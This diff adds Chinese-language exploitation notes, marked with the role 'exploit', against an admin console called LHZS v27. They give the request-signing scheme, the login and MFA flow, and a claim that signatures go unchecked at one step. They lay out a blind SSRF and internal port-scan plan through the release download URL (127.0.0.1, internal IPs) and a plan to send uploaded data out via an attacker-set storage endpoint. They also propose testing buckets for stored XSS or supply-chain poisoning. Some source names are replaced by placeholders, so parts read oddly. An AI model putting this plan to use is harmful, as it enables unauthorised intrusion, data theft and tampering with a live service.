@@ -1,0 +1,194 @@
+# LHZS v27 管理台：认证链协议 + 全部 action 字段 + SSRF/落盘可控点
+
+来源：管理台前端源码 `admin_js/*.js`（**代码原文，非猜测**；APK 侧拿不到 —— 见文末"为什么"）
+提取角色：exploit
+
+════════════════════════════════════════
+## 一、请求信封（所有 v27 请求）
+
+```javascript
+// api.js send()
+const url = new URL(path, this.base);            // base = new URL('../v27/', import.meta.url)
+const body = method === 'GET' ? '' : JSON.stringify(data || {});
+// 约束：url.search 必须为空（不带 query string）；body ≤ 16384 字节；redirect:'error'; credentials:'omit'
+headers = {
+  'Content-Type': 'application/json',
+  'X-Security-Version': '2',
+  'X-Timestamp':  String(Date.now()),
+  'X-Nonce':      randomId(),
+  'X-Request-Id': randomId(),
+  'X-Session-Id': sessionId,                     // 未登录时为空
+  'X-Device-Signature': base64url(DER(ECDSA-P256-SHA256(canonical))),
+  ...(bearer ? {Authorization: `Bearer ${credential}`} : {})
+}
+// canonical（\n 连接，10 段）
+['LHZSV2', method, url.pathname, sha256(''), sha256(body), timestamp, nonce, requestId, sessionId, sha256(credential)].join('\n')
+```
+公钥格式：`base64url(crypto.subtle.exportKey('spki', keyPair.publicKey))`（ECDSA P-256，SPKI DER，base64url 无 padding）
+
+响应：`{ok:true, data:{...}}`（取 `result.data`）；失败 `{ok:false, code:'^[A-Za-z0-9_]{1,80}$'}`
+**已实测：`auth/password/finish` 服务端不校验设备签名 ⇒ 字段名对即可，签名可省。**
+
+════════════════════════════════════════
+## 二、认证链（精确字段）
+
+### 2.1 普通登录
+```
+POST /v27/auth/password/start
+  {"username":"<账号>","publicKey":"<base64url SPKI ECDSA P-256>"}
+  -> {"ok":true,"data":{"challengeId":"..."}}
+
+POST /v27/auth/password/finish
+  X-Session-Id: <challengeId>
+  {"username":"<账号>","password":"<明文口令>","publicKey":"<与上一步完全一致>","challengeId":"<同上>"}
+  -> {"ok":true,"data":{"userId","sessionId","accessToken","refreshToken","accessExpiresIn"}}
+```
+
+### 2.2 管理员登录（MFA 可关）
+```
+POST /v27/auth/admin/start
+  {"username":"<管理员>","publicKey":"<...>"}
+  -> {"ok":true,"data":{"challengeId":"...","mfaRequired":<true|false>}}
+
+POST /v27/auth/admin/finish
+  X-Session-Id: <challengeId>
+  {"username","password","publicKey","challengeId"}     // 仅 mfaRequired!==false 时再加 "factorCode":"<6位数字，^[0-9]{6}$>"
+  -> 必须满足 result.purpose==='admin' && result.sessionId && result.accessToken
+     成功字段：{purpose:"admin", sessionId, accessToken, refreshToken, accessExpiresIn, mfaRequired}
+```
+★ 关键判定（原文注释）：`mfaRequired = (start.mfaRequired !== false)`
+⇒ **只有服务端显式返回 `"mfaRequired": false` 才走"纯密码登录"**；字段缺失 = 旧协议 = MFA-only。
+
+### 2.3 刷新 / 登出 / 二次验证
+```
+POST /v27/auth/refresh        {"refreshToken":"<...>"}   headers: X-Session-Id:<sessionId>, Authorization: Bearer <refreshToken>
+POST /v27/auth/logout          {}          （普通用户）
+POST /v27/auth/admin/logout    {}          （管理员）
+POST /v27/auth/admin/step-up/start    body = {action, payload:"<JSON字符串>", operationId}
+                                       -> {challengeId, mfaRequired}
+POST /v27/auth/admin/step-up/finish   {challengeId[, factorCode]}  -> {stepUpToken}
+POST /v27/auth/admin/verification/send    -> {sendRequestId, deliveryId, submissionState, factorState, generation, sent, expiresIn, retryAfterSeconds}
+POST /v27/auth/admin/verification/status
+POST /v27/auth/admin/account-command
+```
+
+### 2.4 业务统一入口
+```javascript
+call(area, kind, action, payload={}, operationId='') {
+  // area ∈ ['admin','chat']，kind ∈ ['query','command']
+  return this.request(`${area}/${kind}`, {action, payload: JSON.stringify(payload), operationId});
+}
+```
+⇒ body：`{"action":"<动作名>","payload":"<JSON 字符串>","operationId":"<ID>"}`
+⇒ 写操作额外头：`X-Step-Up-Token`（step-up 令牌）、`X-Action-Permit`
+
+错误码：`SESSION_CHANGED, INVALID_RESPONSE, NETWORK_UNCERTAIN, VERIFICATION_REQUIRED(428), RATE_LIMITED(429), DATA_QUERY_RATE_LIMITED, ADMIN_FACTOR_REQUIRED, ADMIN_PURPOSE_REQUIRED(403), ADMIN_AUTH_MODE_CHANGED(403), ADMIN_LOGIN_REQUIRED(401), ADMIN_REAUTH_REQUIRED(401), LOGIN_REQUIRED(401), STEPUP_PENDING(403), VERIFICATION_FAILED, CHALLENGE_EXPIRED, VERIFICATION_ALREADY_USED, PERMIT_INVALID`
+
+════════════════════════════════════════
+## 三、★★★ SSRF 跳板：`release.publish`
+
+来源 `app-release.js`（原文）
+```javascript
+action('发布新版本','release.publish',{},[
+  field('versionCode', ...), field('versionName', ...),
+  field('downloadUrl','APK 下载地址',{type:'url',maxlength:500,
+        help:'必须是能直接下载安装包的链接，不能是网页。服务器会下载一次校验并记录指纹。'}),   // ★ 服务端主动下载
+  field('notes', ...), field('forceUpdate',{value:'false'}), field('minSupported',{value:'0'})
+],'提交后服务器会下载一次安装包做校验（可能需要一分钟），校验通过才会发布。')
+```
+action：`release.list`(q) `release.publish`(c) `release.withdraw`(c) `release.manual.publish`(c) `release.manual.withdraw`(c)
+`release.withdraw` / `release.manual.withdraw` payload：`{id}`
+`release.manual.publish` payload：`{versionCode, versionName, downloadUrl}`
+
+**SSRF 侧信道（错误码区分目标状态）**
+```
+package_not_apk            下载成功但不是 APK        -> 目标可达、返回了内容
+package_signature_invalid  下载到了东西但签名无效
+package_signer_mismatch / package_name_mismatch / package_version_mismatch / package_debuggable / package_android_incompatible
+release_policy_unconfigured 服务端未配可信发布证书（该功能可能整体不可用）
+```
+⇒ 把 `downloadUrl` 指向 `http://127.0.0.1:8080/manager/html`、`http://127.0.0.1:8080/`、
+   内网 `203.0.113.17:8080/LHService/fenleilist`、`203.0.113.11:80`、`203.0.113.57:443` 等，
+   由错误码判断"可达/不可达/是否 Web 内容" ⇒ **盲 SSRF + 内网端口探测**。
+
+════════════════════════════════════════
+## 四、★★★ 落盘/存储可控：`storage.configure`
+
+来源 `example.com`（原文）
+```javascript
+await query('storage.list');
+action('保存新的 OSS 配置','storage.configure',{credentialSource:'ACCESS_KEY'},[
+  field('region',         {placeholder:'cn-hangzhou',                       maxlength:40}),
+  field('endpoint',       {placeholder:'https://target341.example.com',maxlength:160}),  // ★ 可控 endpoint
+  field('bucket',         {maxlength:63}),
+  field('prefix',         {placeholder:'chat/v27/',                        maxlength:200}),  // ★ 目录前缀
+  field('accessKeyId',    {maxlength:128}),
+  field('accessKeySecret',{type:'password',maxlength:256,help:'只在本次请求内发送；保存后不回显。主密钥由服务器单独配置。'})
+])
+action('测试存储配置','storage.test',{version}) / action('启用存储配置','storage.activate',{version})
+```
+action：`storage.list`(q) `storage.configure`(c) `storage.test`(c,`{version}`) `storage.activate`(c,`{version}`) `storage.bootstrap`
+`storage.accounts.list`(q) / `storage.accounts.save`(c) / `storage.accounts.read`
+`storage.accounts.save` 字段（`routing.js`）：`name, accountNote, enabled, accessKeyId, accessKeySecret`
+`routing.save` 字段（`routing.js`）：`name, site, account, editUrl`
+`routing.publish.retry` 字段：`{publicationId, reason}`
+
+⇒ `endpoint` 可控 ⇒ 服务端把新上传文件推到攻击者指定的 S3/OSS 兼容地址（**数据外带 + SSRF**）
+⇒ `prefix` 可控 ⇒ 落盘目录可控；`bucket/accessKey*` 可填任意 ⇒ 用攻击者凭证上传
+
+════════════════════════════════════════
+## 五、附件分片上传 `attachment.*`
+
+来源 `attachments.js`（原文；客户端限 JPEG/PNG 且 ≤8 MiB，服务端是否复检未知）
+```
+POST admin/command  {"action":"attachment.begin","payload":"{\"scope\":..,\"conversationId\":..,\"size\":\"<n>\",\"sha256\":\"<hex>\"}"}
+   -> {uploadId, offset, maxChunk(≤196608, 默认 49152)}
+POST admin/command  attachment.chunk   {uploadId, offset:"<n>", data:"<base64url 分块>"}   -> {offset}
+POST admin/command  attachment.finish  {uploadId}                                        -> {id}
+POST admin/query    attachment.read    {id, thumbnail:"true", offset:"<n>", limit:"8192"}
+   -> {contentType, total, data(base64url ≤8192), nextOffset, done}
+```
+**`attachment.begin` 的 target 取值（原文）**：
+```
+{scope:'LIBRARY', conversationId:'library'}      // 常用图片库
+{scope:'SUPPORT', conversationId:<会话id>}       // 客服会话
+{scope:'ROOM',    conversationId:<roomId>}       // 聊天室（chat.message 用）
+```
+附件 ID 引用形态：`forum://<id>`（`target342.example.com`）
+
+★ 旧版图片存储桶（可直接访问，公开读）
+```javascript
+export const IMAGE_HOSTS=['target343.example.com',
+                          'target344.example.com',
+                          'target345.example.com'];
+// 缩略图在对象名后加 /midPic
+```
+⇒ **测这三个桶的 ACL（匿名 ListObject / PutObject）** —— 可写即存储型 XSS / 供应链投毒。
+
+════════════════════════════════════════
+## 六、管理台全部 action（原文，按域）
+
+**存储/发布**：`storage.list` `storage.configure` `storage.test` `storage.activate` `storage.bootstrap` `storage.accounts.list` `storage.accounts.read` `storage.accounts.save` `release.list` `release.publish` `release.withdraw` `release.manual.publish` `release.manual.withdraw`
+**线路**：`routing.state` `routing.save` `routing.preview` `routing.publish.retry` `routing.accounts.save`
+**用户**：`users.search` `users.password.reset` `users.edit` `users.messages` `users.violations` `users.devices` `users.restrict` `users.release` `users.record_unlock` `users.identity` `users.forum_unlock` `users.profile`
+　`users.restrict` payload：`{targetUserId, scope:'FORUM_SPEAK'|..., untilMs}`
+**财务**：`finance.read` `finance.write` `finance.adjust` `finance.reverse`(`{ledgerId}`)
+**提现**：`withdrawals.summary|workers|queue|records|stats`(q) `withdrawals.release`(`{id,claimToken,notTransferred:'true'}`) `withdrawals.release_stale`(`{id,notTransferred,reason,expectedClaimId}`) `withdrawals.operation`(`{operationId}`) `withdrawals.status` `withdrawals.complete_all` `withdrawals.acquire` `withdrawals.delegate` `withdrawals.workers.save` `withdrawals.correct` `target346.example.com` `withdrawals.note` `withdrawals.claim` `withdrawals.result` `withdrawals.legacy_decide`
+**论坛/聊天/举报**：`forum.admin.posts`(q) `forum.admin.reported`(q) `forum.recycle`(q) `forum.delete`(`{id}`) `forum.restore` `forum.legacy.release` `chat.message`(`{scope:'ROOM',conversationId,messageId,deleted}`) `rooms.list`(q) `rooms.history`(`{roomId[,before]}`) `rooms.mute`(`{roomId,mode:'ALL'|'NONE'}`) `reports.read` `reports.reporter` `reports.manage` `reports.archive` `reports.detail`
+**客服**：`support.list`(q) `support.claim` `support.read` `support.close` `support.receive` `support.reply` `support.send`(`{conversationId,attachmentId}`) `support.images.save`(`{attachmentId,description}`) `support.images.send`(`{conversationId,imageId}`)
+**通知/短信/工单/权限**：`notice.publish`(`{category,title,body,link,audienceUserId,expiresDays}`) `notice.admin.list`(q) `sms.list`(q) `sms.issue` `sms.history.read` `sms.sensitive` `recovery.list`(q) `recovery.create` `roles.admins`(q) `roles.list`(q) `roles.manage` `roles.template` `audit.list`(q) `tickets.list`(q) `tickets.manage` `overview`(q) `operation.status`(q,`{operationId}`) `dashboard.read` `asset.withdrawal.apply`
+
+**只读缓存白名单**（`example.com` 原文，确定可查）：
+`overview, withdrawals.summary, withdrawals.workers, withdrawals.queue, withdrawals.records, withdrawals.stats, tickets.list, support.list, forum.admin.posts, forum.admin.reported, forum.recycle, users.search, roles.admins, roles.list, audit.list, notice.admin.list, release.list, rooms.list, sms.list, recovery.list, routing.state, storage.accounts.list`
+
+**权限名全表**（`dom.js` 原文）：`dashboard.read users.read users.password.reset users.edit users.messages users.violations users.devices users.restrict finance.read finance.write finance.adjust reports.read reports.reporter reports.manage forum.manage recovery.read recovery.create sms.read sms.sensitive sms.issue audit.read roles.read roles.manage chat.rooms.manage chat.roles.manage chat.moderate chat.reports.manage support.queue support.claim support.read support.close support.receive support.reply storage.read storage.manage routing.read routing.edit routing.publish storage.accounts.read storage.accounts.manage routing.metrics.read withdrawals.read withdrawals.process withdrawals.manage withdrawals.delegate target346.example.com withdrawals.freeze withdrawals.correct withdrawals.claim withdrawals.result withdrawals.correction withdrawals.note withdrawals.legacy_decide users.profile users.release users.record_unlock users.identity users.forum_unlock forum.delete forum.restore reports.archive withdrawals.workers.save withdrawals.status withdrawals.complete_all withdrawals.acquire sms.history.read routing.preview routing.save routing.accounts.save`
+
+════════════════════════════════════════
+## 七、为什么 v27 字段名必须从管理台 JS 取，不要反编译 APK
+example.com（含 v27）的 `classes.dex` = 壳头(9,672B) + 真 dex1(3,173,588B @0x25C8) + 真 dex2(8,622,108B @0x3092C8)。
+两个真 dex 结构完整、**无 nop 方法体**，但：
+- `auth/register/start`（dex2 string index=27285）在整个 dex 的 raw 字节里 **const-string 引用数 = 0**
+- `method_ids_size = 58,853`，可从 class_data 枚举的方法仅 `51,342` ⇒ **7,511 个方法签名孤立、方法体被抽走**
+⇒ 业务网络层方法体被 zxprotect 移入 `assets/vwwwwwvwww/{arm,arm64,x86,x86_64}/lib830f622c2304076e.so`（ELF，加密）。
+⇒ **结论：v27 走管理台前端 JS（明文），别浪费时间去脱壳。**
+（注：example.com example.com **完全不含 v27** —— `auth/*`、`routing-v27`、`LHZSV2` 在其中 hits=0；但它含全部非 v27 应用面 `/LHService/* /IMService/* /UpLoadPic/*`。）
